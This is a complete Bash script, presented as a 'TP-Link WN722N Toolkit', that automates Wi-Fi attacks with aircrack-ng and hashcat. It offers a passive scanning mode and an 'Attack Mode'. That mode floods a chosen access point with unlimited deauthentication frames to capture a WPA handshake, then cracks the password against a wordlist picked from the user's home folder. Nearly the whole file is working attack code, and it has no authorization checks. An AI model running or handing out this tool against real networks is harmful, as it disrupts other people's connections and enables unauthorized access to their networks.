#!/bin/bash

# Global variables
INTERFACE=""
MON_IFACE=""
HANDSHAKE_FILE=""
SCAN_FILE="scan_results.csv"
WORDLIST=""
CRACK_TOOL=""

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Check dependencies
check_deps() {
    local deps=("sudo" "fzf" "aircrack-ng" "aireplay-ng" "airodump-ng" "hashcat" "xterm")
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            echo -e "${RED}Error: $dep not installed!${NC}"
            exit 1
        fi
    done
}

# TP-Link specific checks
tp_link_checks() {
    if ! lsmod | grep -q ath9k_htc; then
        echo -e "${YELLOW}[!] Loading ath9k_htc module...${NC}"
        sudo modprobe ath9k_htc || {
            echo -e "${RED}Failed to load ath9k_htc driver!${NC}"
            exit 1
        }
    fi

    if [ ! -f /lib/firmware/htc_9271.fw ]; then
        echo -e "${RED}Missing firmware htc_9271.fw!${NC}"
        echo "Install with: sudo pacman -S linux-firmware"
        exit 1
    fi
}

# Main menu
main_menu() {
    while true; do
        choice=$(printf '%s\n' \
            "Select Wireless Interface" \
            "About" \
            "Credit" \
            "Exit" | fzf --prompt="Main Menu > " --header="TP-Link WN722N Toolkit" --height=40% --reverse)
        
        case "$choice" in
            "Select Wireless Interface") select_interface ;;
            "About") show_about ;;
            "Credit") show_credit ;;
            "Exit") exit 0 ;;
        esac
    done
}

# Interface selection with TP-Link detection
select_interface() {
    clear
    echo -e "${YELLOW}[!] TP-Link WN722N Interface Detection...${NC}"
    
    # Find TP-Link specific interface
    mapfile -t interfaces < <(airmon-ng | awk '/ath9k_htc/ {print $2}')
    
    if [ ${#interfaces[@]} -eq 0 ]; then
        echo -e "${RED}No TP-Link interfaces found!${NC}"
        echo -e "Check:"
        echo "1. Device is plugged in"
        echo "2. Driver is loaded (lsmod | grep ath9k_htc)"
        echo "3. No other processes blocking (sudo airmon-ng check kill)"
        read -p "Press Enter to retry..."
        select_interface
        return
    fi
    
    INTERFACE=$(printf '%s\n' "${interfaces[@]}" | fzf --prompt="Select TP-Link interface > " --header="Detected Interfaces")
    [ -z "$INTERFACE" ] && return
    
    enable_monitor_mode
    operation_menu
}

# Monitor mode handling for AR9271
enable_monitor_mode() {
    echo -e "${YELLOW}[!] Starting monitor mode...${NC}"
    sudo airmon-ng check kill >/dev/null 2>&1
    
    if ! sudo airmon-ng start "$INTERFACE" >/dev/null 2>&1; then
        echo -e "${RED}Failed to start monitor mode!${NC}"
        echo "Try manual command: sudo airmon-ng start $INTERFACE"
        read -p "Press Enter to continue..."
        return 1
    fi
    
    MON_IFACE="${INTERFACE}mon"
    echo -e "${GREEN}Monitor mode active on $MON_IFACE${NC}"
    sleep 1
}

# Operation menu
operation_menu() {
    choice=$(printf '%s\n' \
        "Attack Mode (Deauth + Handshake Capture)" \
        "Sniffing Mode (Passive Scanning)" \
        "Return to Main Menu" | fzf --prompt="Operation Mode > " --header="TP-Link Operations" --height=40%)
    
    case "$choice" in
        "Attack Mode (Deauth + Handshake Capture)") attack_mode ;;
        "Sniffing Mode (Passive Scanning)") sniffing_mode ;;
        "Return to Main Menu") main_menu ;;
    esac
}

# Attack mode process
attack_mode() {
    start_scan
    target_selection
    capture_handshake
    if [ $? -eq 0 ]; then
        select_wordlist
        select_crack_tool
        start_cracking
    else
        echo -e "${RED}Handshake capture failed!${NC}"
        sleep 2
    fi
    cleanup
}

# Sniffing mode
sniffing_mode() {
    start_scan
    echo -e "${GREEN}Scan results saved to $SCAN_FILE${NC}"
    echo "Press Enter to return"
    read -r
    cleanup
}

# Scanning process
start_scan() {
    echo -e "${YELLOW}[!] Starting network scan (15 seconds)...${NC}"
    timeout 15s sudo airodump-ng -w scan --output-format csv "$MON_IFACE" >/dev/null 2>&1
    sed -i '/^Station MAC/,$d' scan-01.csv
    mv scan-01.csv "$SCAN_FILE" 2>/dev/null
}

# Target selection
target_selection() {
    target=$(awk -F',' 'NR>5 && length($1) == 17 {print $1","$4","$6}' "$SCAN_FILE" | 
        fzf --prompt="Select target > " --header="BSSID,Channel,ESSID" --delimiter=',')
    
    [ -z "$target" ] && return 1
    
    BSSID=$(echo "$target" | cut -d',' -f1)
    CHANNEL=$(echo "$target" | cut -d',' -f2 | xargs)
    ESSID=$(echo "$target" | cut -d',' -f3)
}

# Handshake capture
capture_handshake() {
    echo -e "${YELLOW}[!] Starting handshake capture on $ESSID${NC}"
    
    xterm -T "Handshake Capture" -e "sudo airodump-ng -c $CHANNEL --bssid $BSSID -w handshake $MON_IFACE" &
    AIRODUMP_PID=$!
    
    xterm -T "Deauth Attack" -e "sudo aireplay-ng --deauth 0 -a $BSSID $MON_IFACE" &
    AIREPLAY_PID=$!
    
    echo -e "${GREEN}Capture running... Press Enter to stop${NC}"
    read -r
    
    kill $AIRODUMP_PID $AIREPLAY_PID 2>/dev/null
    
    if aircrack-ng handshake-01.cap 2>/dev/null | grep -q "1 handshake"; then
        HANDSHAKE_FILE="handshake-01.cap"
        echo -e "${GREEN}Handshake captured successfully!${NC}"
        return 0
    else
        echo -e "${RED}No handshake found!${NC}"
        rm -f handshake-01.*
        return 1
    fi
}

# Wordlist selection
select_wordlist() {
    WORDLIST=$(find ~/ -type f \( -name "*.txt" -o -name "*.lst" \) 2>/dev/null |
        fzf --height 80% --reverse --prompt "Select wordlist > " \
        --preview "head -n 25 {} 2>/dev/null || echo 'Preview not available'")
}

# Cracking tool selection
select_crack_tool() {
    CRACK_TOOL=$(printf '%s\n' "aircrack-ng (CPU)" "hashcat (GPU)" | 
        fzf --prompt="Select cracking tool > " --header="Cracking Method")
}

# Start cracking process
start_cracking() {
    case "$CRACK_TOOL" in
        "aircrack-ng (CPU)")
            xterm -T "Aircrack-ng" -e "sudo aircrack-ng -w '$WORDLIST' '$HANDSHAKE_FILE'; read -p 'Press Enter to close...'" &
            ;;
        "hashcat (GPU)")
            hc_file="${HANDSHAKE_FILE%.cap}.hccapx"
            aircrack-ng "$HANDSHAKE_FILE" -J "$hc_file" >/dev/null 2>&1
            xterm -T "Hashcat" -e "hashcat -m 22000 '$hc_file' '$WORDLIST'; read -p 'Press Enter to close...'" &
            ;;
    esac
}

# Cleanup
cleanup() {
    echo -e "${YELLOW}[!] Cleaning up...${NC}"
    sudo airmon-ng stop "$MON_IFACE" >/dev/null 2>&1
    rm -f scan-*.csv handshake-*.* *.hccapx 2>/dev/null
    sudo systemctl restart NetworkManager >/dev/null 2>&1
}

# Information screens
show_about() {
    clear
    echo -e "${GREEN}TP-Link WN722N Toolkit${NC}"
    echo "---------------------------"
    echo "Optimized for AR9271 chipset"
    echo "Features:"
    echo -e "${YELLOW}- One-click monitor mode"
    echo -e "- Targeted handshake capture"
    echo -e "- Integrated deauth attack"
    echo -e "- Hashcat/aircrack integration${NC}"
    read -p "Press Enter to return..."
}

show_credit() {
    clear
    echo -e "${GREEN}Credits:${NC}"
    echo "------------"
    echo -e "- Aircrack-ng Team"
    echo -e "- Hashcat Team"
    echo -e "- Linux Wireless Team (ath9k_htc)"
    echo -e "- TP-Link Hardware Team"
    read -p "Press Enter to return..."
}

# Main execution
trap cleanup EXIT
check_deps
tp_link_checks
main_menu
